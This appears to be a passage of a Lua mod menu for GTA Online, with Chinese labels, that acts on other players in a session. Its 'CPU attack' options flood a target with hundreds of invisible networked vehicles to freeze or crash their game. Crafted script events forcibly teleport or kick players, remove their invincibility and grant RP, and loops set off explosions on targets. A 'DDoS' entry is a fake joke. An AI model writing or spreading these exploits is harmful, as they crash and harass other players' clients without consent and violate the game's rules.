            Specoff(pid)
        end
    end)

    local cvmenu = menu.list(pvehmenu, '给他们一辆车', {}, '')

    local cus = {veh = util.joaat('toreador')}
    menu.action(cvmenu, '产卵车', {'spv'}, '为他们生成自定义车辆，默认为斗牛士', function ()
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        Vspawn(cus.veh, tar1, targets, 'custveh')
    end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.text_input(cvmenu, '输入自定义车辆哈希', {'cussmash'}, '输入 Vehicle Hash 以更改给玩家的 Vehicle', function(cusveh)
        if not players.exists(pid) then
            util.stop_thread()
        end
        if STREAMING.IS_MODEL_A_VEHICLE(util.joaat(cusveh)) then
           cus.veh = util.joaat(cusveh)
        else
           if set.alert then
               menu.toast('不正确的车辆名称（检查拼写）')
           end
        end
    end, 'toreador')

    menu.action(pvehmenu, '随机绘画', {'rpaint'}, '随机化他们车辆的油漆', function ()
        GetPlayVeh(pid, function ()
            Rpaint(pid)
        end)
    end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.action(pvehmenu, '旁观者', {''}, '打开/关闭玩家的观看', function ()
        menu.trigger_commands("spectate".. players.get_name(pid))
    end)

    menu.action(friendly, "给他/她升升级", {}, "给予该玩家17万RP经验,可从1级提升至25级.\n一名玩家只能用一次嗷", function()
        util.trigger_script_event(1 << pid, {697566862, pid, 5, 0, 1, 1, 1})
        for i = 0, 9 do
            util.trigger_script_event(1 << pid, {697566862, pid, 0, i, 1, 1, 1})
            util.trigger_script_event(1 << pid, {697566862, pid, 1, i, 1, 1, 1})
            util.trigger_script_event(1 << pid, {697566862, pid, 2, i, 1, 1, 1})
            util.trigger_script_event(1 << pid, {697566862, pid, 10, i, 1, 1, 1})
        end
        for i = 0, 1 do
            util.trigger_script_event(1 << pid, {697566862, pid, 2, i, 1, 1, 1})
            util.trigger_script_event(1 << pid, {697566862, pid, 6, i, 1, 1, 1})
        end
        for i = 0, 19 do
            util.trigger_script_event(1 << pid, {697566862, pid, 4, i, 1, 1, 1})
        end
        for i = 0, 99 do
            util.trigger_script_event(1 << pid, {697566862, pid, 9, i, 1, 1, 1})
            util.yield()
        end
    end)

    local rpwarning
     rpwarning = menu.action(friendly, "循环给予经验收藏品", {}, "循环收藏品功能", function(click_type)
        menu.show_warning(rpwarning, click_type, "警告:这可能会导致封禁,后果自负.", function()
            local rp_loop = menu.list(friendly, "循环给予收藏品", {}, "")
            menu.delete(rpwarning)
            local rp_delay = 500
            menu.slider(rp_loop, "延迟", {"givedelay"}, "", 0, 2500, 500, 10, function(amount)
                rp_delay = amount
            end)

            menu.toggle_loop(rp_loop, "启用循环", {}, "每个收藏品会给玩家1000RP经验", function()
                util.trigger_script_event(1 << pid, {697566862, pid, 4, -1, 1, 1, 1})
                util.yield(rp_delay)
            end)
            menu.trigger_command(rp_loop)
        end)
    end)

    menu.action(friendly, "解除无限加载屏幕", {}, "尝试通过给玩家一个脚本主机并传送到最近的公寓来修复玩家的无限加载屏幕.", function()
        menu.trigger_commands("givesh" .. playerName)
        menu.trigger_commands("aptme" .. playerName)
    end)

    local player_jinx_army = {}
    local army_player = menu.list(friendly, "宠物猫Jinx军队", {}, "整点小猫哄着你玩玩?\n删不掉的时候觉得烦的话换战局\n能少生成就少生成吧")
    menu.click_slider(army_player, "生成宠物猫Jinx军队", {}, "", 1, 256, 30, 1, function(val)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        pos.y = pos.y - 5
        pos.z = pos.z + 1
        local jinx = util.joaat("a_c_cat_01")
        request_model(jinx)
        for i = 1, val do
            player_jinx_army[i] = entities.create_ped(28, jinx, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(player_jinx_army[i], true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_jinx_army[i], true)
            PED.SET_PED_COMPONENT_VARIATION(player_jinx_army[i], 0, 0, 1, 0)
            TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_jinx_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
            util.yield()
        end 
    end)

    menu.action(army_player, "清除Jinx宠物猫", {}, "有几只清不掉的时候你就傻了 嘿嘿\n追着你喵喵叫 嘿嘿", function()
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if PED.IS_PED_MODEL(ped, util.joaat("a_c_cat_01")) then
                entities.delete_by_handle(ped)
            end
        end
    end)

    local pteleportEntities = menu.list(playerMain, "传东西到玩家", {}, "")
    menu.action(pteleportEntities, "传NPC", {""}, "", function ()
        TpAllPeds(pid)
    end)
    menu.action(pteleportEntities, "传载具", {""}, "", function ()
        TpAllVehs(pid)
    end)
    menu.action(pteleportEntities, "传实体", {""}, "", function ()
        TpAllObjects(pid)
    end)
    menu.action(pteleportEntities, "传拾取物", {""}, "", function ()
        TpAllPickups(pid)
    end)
	

	local cpuburn = menu.list(playerMain, "CPU攻击", {}, "")
	fish_options = menu.list(cpuburn, "CPU V1", {}, "")

	menu.divider(fish_options, "炸鱼")
	
    Ptools_PanTable = {}
    Ptools_PanCount = 1
    Ptools_FishPan = 20

    menu.action(fish_options, "炸鱼", {""}, "卡死", function ()
        local targetped = PLAYER.GET_PLAYER_PED(pid)
        local targetcoords = ENTITY.GET_ENTITY_COORDS(targetped)

        local hash = util.joaat("tug")
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end

        for i = 1, Ptools_FishPan do
            Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)
            ----
            local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)
            ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)
            ----
            if SE_Notifications then
                util.toast("Spawned with index of " .. Ptools_PanCount)
            end
            Ptools_PanCount = Ptools_PanCount + 1
        end
    end)


    menu.slider(fish_options, "数量", {""}, "鱼的数量1-300", 1, 300, 20, 1, function(value)
        Ptools_FishPan = value
    end)

    menu.action(fish_options, "删除", {""}, "Yep", function ()
        for x = 1, 5, 1 do
            for i = 1, #Ptools_PanTable do
                entities.delete_by_handle(Ptools_PanTable[i])
                util.yield(10)
            end
        end
        --
        Ptools_PanCount = 1
        Ptools_PanTable = {}
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("tug"))
    end)
	
menu.action(cpuburn,"CPU V2", {}, "CPU v2", function() 
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		notification("开始干他", colors.black)
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("干完", colors.green) 
		menu.trigger_commands("anticrashcamera off")
		util.yield(5000)
	end)

    menu.action(cpuburn,"CPU V3", {}, "CPU v3", function() 
		while not STREAMING.HAS_MODEL_LOADED(-305727417) do
			STREAMING.REQUEST_MODEL(-305727417)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)
		notification("开始干他", colors.blue)
        menu.trigger_commands("violentfreeze" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("rockets" .. PLAYER.GET_PLAYER_NAME(pid))
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(-305727417, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("干完", colors.blue) 
        menu.trigger_commands("violentfreeze" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("rockets" .. PLAYER.GET_PLAYER_NAME(pid))
		util.yield(5000)
	end)
	
    menu.action(cpuburn, "DDoS", {}, "通过向其路由器发送数据包对玩家进行DDoS攻击", function()
        util.toast("成功发送DDoS攻击到" ..players.get_name(pid))
        local percent = 0
        while percent <= 100 do
            util.yield(100)
            util.toast(percent.. "% done")
            percent = percent + 1
        end
        util.yield(3000)
        util.toast("开个玩笑你个笨比")
    end)    

    local antimodder = menu.list(playerMain, "反作弊者", {}, "")
    local kill_godmode = menu.list(antimodder, "击杀无敌玩家", {}, "")
    menu.action(kill_godmode, "击杀无敌玩家", {""}, "适用于小菜单", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 99999, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end)

    menu.textslider_stateful(kill_godmode, "压死无敌玩家", {}, "", {"Khanjali", "APC"}, function(index, veh)
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        local vehicle = util.joaat(veh)
        request_model(vehicle)
        switch veh do
            case "Khanjali":
            height = 2.8
            offset = 0
            break
            case "APC":
            height = 3.4
            offset = -1.5
            break
        end

        if TASK.IS_PED_STILL(player) then
            distance = 0
        elseif not TASK.IS_PED_STILL(player) then
            distance = 3
        end

        local vehicle1 = entities.create_vehicle(vehicle, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), offset, distance, height), ENTITY.GET_ENTITY_HEADING(player))
        local vehicle2 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle3 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle4 = entities.create_vehicle(vehicle, pos, 0)
        local spawned_vehs = {vehicle4, vehicle3, vehicle2, vehicle1}
        for i = 1, #spawned_vehs do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_vehs[i])
        end
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end)

    player_toggle_loop(kill_godmode, pid, "炸死无敌玩家", {}, "被大多数菜单拦截", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        if not PED.IS_PED_DEAD_OR_DYING(ped) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) then
            util.trigger_script_event(1 << pid, {0xAD36AA57, pid, 0x96EDB12F, math.random(0, 0x270F)})
            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), pos.x, pos.y, pos.z, 2, 50, true, false, 0.0)
        end
    end)

    player_toggle_loop(antimodder, pid, "移除玩家无敌", {}, "被大多数菜单拦截", function()
        util.trigger_script_event(1 << pid, {0xAD36AA57, pid, 0x96EDB12F, math.random(0, 0x270F)})
    end)

    player_toggle_loop(antimodder, pid, "移除无敌玩家武器", {}, "被小部分菜单拦截", function()
        for _, pid in ipairs (players.list(true, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            if PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(players.user(), player) and players.is_godmode(pid) then
                util.trigger_script_event(1 << pid, {0xAD36AA57, pid, 0x96EDB12F, math.random(0, 0x270F)})
            end
        end
    end)

    player_toggle_loop(antimodder, pid, "移除载具无敌", {"removevgm"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
            ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
            ENTITY.SET_ENTITY_PROOFS(veh, false, false, false, false, false, 0, 0, false)
        end
    end)
	
    local tp_player = menu.list(playerMain, "传送玩家到", {}, "被大多数菜单拦截")
    local clubhouse = menu.list(tp_player, "摩托帮会所", {}, "")
    local facility = menu.list(tp_player, "设施", {}, "")
    local arcade = menu.list(tp_player, "游戏厅", {}, "")
    local warehouse = menu.list(tp_player, "仓库", {}, "")
    local cayoperico = menu.list(tp_player, "佩里科岛", {}, "")
    local interiors = menu.list(tp_player, "室内", {}, "") -- thx to aaron for sending me the labels and their numbers for most of the interiors <3

    for id, name in pairs(All_business_properties) do
        if id <= 12 then
            menu.action(clubhouse, name, {}, "", function()
                util.trigger_script_event(1 << pid, {879177392, pid, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(1, 10)})
            end)
        elseif id > 12 and id <= 21 then
            menu.action(facility, name, {}, "", function()
                util.trigger_script_event(1 << pid, {879177392, pid, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end)
        elseif id > 21 then
            menu.action(arcade, name, {}, "", function() 
                util.trigger_script_event(1 << pid, {879177392, pid, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
            end)
        end
    end

    local small = menu.list(warehouse, "小型仓库", {}, "")
    local medium = menu.list(warehouse, "中型仓库", {}, "")
    local large = menu.list(warehouse, "大型仓库", {}, "")

    for id, name in pairs(small_warehouses) do
        menu.action(small, name, {}, "", function()
            util.trigger_script_event(1 << pid, {434937615, pid, 0, 1, id})
        end)
    end

    for id, name in pairs(medium_warehouses) do
        menu.action(medium, name, {}, "", function()
            util.trigger_script_event(1 << pid, {434937615, pid, 0, 1, id})
        end)
    end

    for id, name in pairs(large_warehouses) do
        menu.action(large, name, {}, "", function()
            util.trigger_script_event(1 << pid, {434937615, pid, 0, 1, id})
        end)
    end

    menu.action(tp_player, "公寓邀请", {}, "被大多数菜单拦截", function()
        util.trigger_script_event(1 << pid, {-168599209, players.user(), pid, -1, 1, 1, 0, 1, 0}) 
    end)
	
    menu.action(cayoperico, "佩里科岛(有过场动画)", {"tpcayo"}, "被大多数菜单拦截", function()
        util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 3, 1})
    end)

    menu.action(cayoperico, "佩里科岛(无过场动画)", {"tpcayo2"}, "被大多数菜单拦截", function()
        util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 4, 1})
    end)

    menu.action(cayoperico, "离开佩里科岛", {"cayoleave"}, "被大多数菜单拦截\n玩家必须在佩里科岛才能触发此事件", function()
        util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 3})
    end)

    menu.action(cayoperico, "从佩里科岛踢出", {"cayokick"}, "被大多数菜单拦截", function()
        util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 4, 0})
    end)

    for id, name in pairs(interior_tps) do
        menu.action(interiors, name, {""}, "Blocked by most menus.", function()
            util.trigger_script_event(1 << pid, {1268038438, pid, id, 1, 0, 1, 1130429716, -1001012850, 1106067788, 0, 0, 1, 2123789977, 1, -1})
        end)
    end

    menu.toggle(playerMain, '混合恶搞', {}, '同时启用Ped笼子,物体笼子,循环爆炸来恶搞玩家', function (on)
        if on then
        menu.trigger_commands("EXPL".. players.get_name(pid))
        menu.trigger_commands("PCAGE".. players.get_name(pid))
        menu.trigger_commands("ObjCage".. players.get_name(pid))
        else
        menu.trigger_commands("EXPL".. players.get_name(pid))
        menu.trigger_commands("FreePedcage".. players.get_name(pid))
        menu.trigger_commands("FreeObjcage".. players.get_name(pid))
        end
    end)

    menu.toggle(playerMain, '发射烟花', {}, '弹飞玩家并把玩家变成烟花炸飞', function (on)
        if on then
        menu.set_value(weaspeed, 100)
        mir.weap = 'weapon_firework'
        menu.trigger_commands("rain".. players.get_name(pid))
        menu.trigger_commands("JuggleC".. players.get_name(pid))
        else
        menu.trigger_commands("rain".. players.get_name(pid))
        menu.trigger_commands("JuggleC".. players.get_name(pid))
        end
    end)

	menu.toggle_loop(friendly, "送他一把爆炸枪", {""}, "绿玩从此成为挂b", function ()
        local pped = PLAYER.GET_PLAYER_PED(pid)
        local impactCoord = v3.new()
        local shot = WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(pped, impactCoord)
        if shot then
            local explo = {x = v3.getX(impactCoord), y = v3.getY(impactCoord), z = v3.getZ(impactCoord)}
            local explo = GetTableFromV3Instance(impactCoord)
            SE_add_owned_explosion(pped, explo.x, explo.y, explo.z, 2, 10, true,false, 0)
        end
        v3.free(impactCoord)
    end)
end	
players.on_join(playerActionsSetup)
players.dispatch_on_join()
local x, y = directx.get_client_size()
local ratio = x/y
local run = false

local wasdww = menu.list(other_options, '按键显示', {''}, '')
menu.toggle(wasdww, '打开', {''}, '', function(on) 
	run = on
end, false)
menu.slider(wasdww, 'X轴', {''}, '',1 , 10000, overlay_x * 10000, 20, function(value)
	overlay_x = value / 10000
end)
menu.slider(wasdww, 'Y轴', {''}, '',1 , 10000, overlay_y * 10000, 20, function(value)
	overlay_y = value / 10000
end)
menu.slider(wasdww, '大小', {''}, '',1 , 10000, 300, 20, function(value)
	size = value / 10000
    boxMargin = size / 7
end)

local color_root = menu.list(wasdww, '颜色', {''}, '')
menu.colour(color_root, '文本颜色', {'co'}, '', key_text_color, true, function(colour)
    key_text_color = colour
end)
menu.colour(color_root, '背景颜色', {'bg-color'}, '', background_colour, true, function(colour)
    background_colour = colour
end)
menu.rainbow(menu.colour(color_root, '按键反馈颜色', {'press-color'}, '', pressed_background_colour, true, function(colour)
    pressed_background_colour = colour
end))


local hide_root = menu.list(wasdww, '隐藏按键', {''}, '')
for i = 1, #wasd do
    menu.toggle(hide_root, wasd[i].key, {}, '', function(toggle)
        wasd[i].show = not toggle
    end)
end

menu.hyperlink(other_options, "baibai lua群", "https://jq.qq.com/?_wv=1027&k=HIG6Q5z6", "欢迎进入提意见")

menu.hyperlink(other_options, "橙子大手子群", "https://jq.qq.com/?_wv=1027&k=oY1U6quz", "除了GTA别的啥都聊的GTA群 由橙子建立 历史悠久")


util.create_tick_handler(function()
    if run then
        for i = 1, #wasd do
            wasd[i].pressed = false
            for j = 1, #wasd[i].keys do
                if PAD.IS_CONTROL_PRESSED(2, wasd[i].keys[j]) then
                    wasd[i].pressed = true
                end
            end
        end
        for i = 1, #wasd - 3 do
            if wasd[i].show then
                directx.draw_rect(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1), overlay_y + (i > 4 and (boxMargin + size * ratio) or 0)* 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
                if not hideKey then
                    directx.draw_text(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
                end
            end
        end
        if altShiftCtrl then
            if wasd[#wasd - 2].show then
                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 2].pressed and pressed_background_colour or background_colour)
            end
            if wasd[#wasd - 1].show then
                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2.5,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 1].pressed and pressed_background_colour or background_colour)
            end
        else
            for i = 9, 10 do
                if wasd[i].show then
                directx.draw_rect(overlay_x - (boxMargin + size), overlay_y + (boxMargin + size * ratio) * (i - 8) * 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
                if not hideKey then
                    directx.draw_text(overlay_x - (boxMargin + size)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio) * (i - 8)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
                end
                end
            end
        end
        if wasd[#wasd].show then
            directx.draw_rect(overlay_x + (boxMargin + size) * altSpaceBar, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) * spaceBarLength - boxMargin, size * ratio / spaceBarSlim, wasd[#wasd].pressed and pressed_background_colour or background_colour)
        end
	end
if safeMonitorToggle then
    local ct = 0
    local spacing = 0.015 + smSettings.scale * smSettings.scale / 50
    for i = 1, #JS_tbls.safeManagerToggles do
        if JS_tbls.safeManagerToggles[i].toggle then
            ct += spacing
            directx.draw_text(1 + smSettings.xOffset / 200, ct + smSettings.yOffset / 200, JS_tbls.safeManagerToggles[i].displayText(), smSettings.alignment, smSettings.scale, smSettings.textColour, false)
        end
    end
end
end)

menu.action(other_options, "重新启动GTAV", {""}, "", function(on_click)
    MISC.RESTART_GAME()
end)

util.on_stop(function()
	if UFO.exists() then
		UFO.destroy()
	end

    if OrbitalCannon.exists() then
		OrbitalCannon.destroy()
	end

	if GuidedMissile.exists() then
		GuidedMissile.destroy()
	end

    Ini.save(configFile, Config)
end)


if do_autoload then
    load_loadout:trigger()
end

local last_car = 0
while true do

    if NETWORK.NETWORK_IS_SESSION_STARTED() then
        local focused = players.get_focused()
        if ((focused[1] ~= nil and focused[2] == nil) or renderwindow) and menu.is_open() then

            --general info grabbing locals
            local pid = focused[1]
            if renderwindow then pid = players.user() end
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local mypos, playerpos = players.get_position(players.user()), players.get_position(pid)
            
            --general element drawing locals
            local playerlisty = guiy + nameh + spacing
            local guiw = textw + padding/aspectratio * 4
            local xspacing = spacing/aspectratio

            -------------
            -- CONTENT --
            -------------

            local heading = ENTITY.GET_ENTITY_HEADING(ped)

            local regions = 
            {
                {
                    width = guiw/2,
                    content =
                    {
                        {'等级', players.get_rank(pid)},
                        {'K/D', round(players.get_kd(pid), 2)},
                        {'钱包', '$'..format_money(players.get_wallet(pid))},
                        {'银行', '$'..format_money(players.get_bank(pid))}
                    }
                },
                {
                    width = guiw/2,
                    content =
                    {
                        {'Language', ({'英语','法语','德语','意大利语','西班牙语','巴西语','波兰语','俄语','韩语','繁体中文','日语','墨西哥语','简体中文'})[players.get_language(pid) + 1]},
                        {'控制器', boolean(players.is_using_controller(pid))},
                        {'延迟', math.floor(NETWORK.NETWORK_GET_AVERAGE_LATENCY(pid) + 0.5)..' ms'},
                        {'主机队列', '#'..players.get_host_queue_position(pid)},
                    }
                },
                {
                    width = guiw + xspacing,
                    content =
                    {
                        {'模型', util.reverse_joaat(ENTITY.GET_ENTITY_MODEL(ped))},
                        {'地区', util.get_label_text(ZONE.GET_NAME_OF_ZONE(playerpos.x, playerpos.y, playerpos.z))},
                        {'武器', weapon_from_hash(WEAPON.GET_SELECTED_PED_WEAPON(ped))},
                        {'载具', check(util.get_label_text(players.get_vehicle_model(pid)))}
                    }
                },
                {
                    width = guiw/2,
                    content =
                    {
                        {'距离', math.floor(MISC.GET_DISTANCE_BETWEEN_COORDS(playerpos.x, playerpos.y, playerpos.z, mypos.x, mypos.y, mypos.z))..' m'},
                        {'速度', math.floor(ENTITY.GET_ENTITY_SPEED(ped) * 3.6)..' km/h'},
                        {'朝向', ({'北','西','南','东','北'})[math.ceil((heading + 45)/90)]..', '..math.ceil(heading)..'°'}
                    }
                },
                {
                    width = guiw/2,
                    content =
                    {
                        {'组织', ({'None','CEO','MC'})[players.get_org_type(pid) + 2]},
                        {'通缉', PLAYER.GET_PLAYER_WANTED_LEVEL(pid)..'/5'},
                        {'过场动画', boolean(NETWORK.IS_PLAYER_IN_CUTSCENE(pid))}
                    }
                },
                {
                    width = guiw + xspacing,
                    content =
                    {
                        {'标签', check(players.get_tags_string(pid))}
                    }
                }
            }

            ---------------------
            -- DRAWING CONTENT --
            ---------------------

            local _, textheight = directx.get_text_size('abcdefg', textsize)
            local xoffset = 0
            local yoffset = 0
            
            for k, region in ipairs(regions) do
                local blurinstance = 1
                local count = 0
                for _ in region.content do count = count + 1 end
                local dictheight = count * (textheight + linespacing) - linespacing + padding * 2

                draw_border(guix + xoffset, playerlisty + yoffset, region.width, dictheight)
                directx.blurrect_draw(blur[blurinstance], guix + xoffset, playerlisty + yoffset, region.width, dictheight, blurstrength)
                draw_rect(guix + xoffset, playerlisty + yoffset, region.width, dictheight, colour_map.background)

                local linecount = 0
                for _, v in ipairs(region.content) do
                    directx.draw_text(
                    guix + xoffset + padding/aspectratio - 0.001, 
                    playerlisty + yoffset + padding + linecount * (textheight + linespacing), 
                    v[1]..': ',
                    ALIGN_TOP_LEFT, 
                    textsize, 
                    colour_map.label
                    )
                    directx.draw_text(
                    guix + xoffset + region.width - padding/aspectratio - 0.001, 
                    playerlisty + yoffset + padding + linecount * (textheight + linespacing), 
                    v[2], 
                    ALIGN_TOP_RIGHT, 
                    textsize, 
                    colour_map.info
                    )
                    linecount += 1
                end

                xoffset += region.width + xspacing
                if xoffset >= guiw then
                    yoffset += dictheight + spacing
                    xoffset = 0
                end
                blurinstance += 1
            end

            --[[
                REST LOCALS 
            --]]

            local guih = yoffset - spacing
            local mapx = guix + guiw + xspacing * 2
            local mapwidth = guih/(898/590)/aspectratio + 0.001
            local totalmapwidth = (mapwidth + padding/aspectratio * 3) * (1 + 1/22)

            --[[ NAME BAR ]]

            draw_border(guix, guiy, guiw + xspacing, nameh)

            directx.blurrect_draw(blur[6], guix, guiy, guiw, nameh, blurstrength)

            draw_rect(guix, guiy, guiw + xspacing, nameh, colour_map.titlebar)

            directx.draw_text(guix + guiw/2, guiy + nameh/2, players.get_name(pid), ALIGN_CENTRE, namesize, colour_map.name)

            --------------
            -- EMPTY BAR --
            ---------------

            draw_border(mapx, guiy, totalmapwidth, nameh)

            directx.blurrect_draw(blur[7], mapx, guiy, totalmapwidth, nameh, blurstrength)

            draw_rect(mapx, guiy, totalmapwidth, nameh, colour_map.titlebar)

            ---------
            -- MAP --
            ---------

            --border, blur, background
            draw_border(mapx, playerlisty, totalmapwidth, guih)

            directx.blurrect_draw(blur[8], mapx, playerlisty, totalmapwidth, guih, blurstrength)

            draw_rect(mapx, playerlisty, totalmapwidth, guih, colour_map.background)

            --map
            directx.draw_texture(textures.map, mapwidth/2, 0, 0, 0, mapx + padding/aspectratio * 2 + totalmapwidth/22, playerlisty, 0, 1, 1, 1, 0.75)

            --blip
            directx.draw_texture(textures.blip, 0.004, 0, 0.5, 0.5, mapx + padding/aspectratio * 2 + totalmapwidth/22 + ((playerpos.x + 4000)/8500) * mapwidth, playerlisty + (1 - (playerpos.y + 4000)/12000) * guih, (360 - heading)/360, colour_map.blip)

            -------------------------
            -- HEALTH & ARMOUR BAR --
            -------------------------

            --armour bar
            local armourperc = PED.GET_PED_ARMOUR(ped)/PLAYER.GET_PLAYER_MAX_ARMOUR(pid)
            local armourbarsecondary = {r = colour_map.armourbar.r/2, g = colour_map.armourbar.g/2, b = colour_map.armourbar.b/2, a = colour_map.armourbar.a}

            draw_rect(mapx + padding/aspectratio, playerlisty + guih/2 - padding/2, totalmapwidth/22, -((guih - padding * 3)/2 * armourperc), colour_map.armourbar) --foreground
            draw_rect(mapx + padding/aspectratio, playerlisty + padding, totalmapwidth/22, (guih - padding * 3)/2 * (1 - armourperc), armourbarsecondary) --background

            --health bar
            local minhealth = ENTITY.GET_ENTITY_HEALTH(ped) - 100
            if minhealth < 0 then minhealth = 0 end

            local healthperc = minhealth/(ENTITY.GET_ENTITY_MAX_HEALTH(ped) - 100)
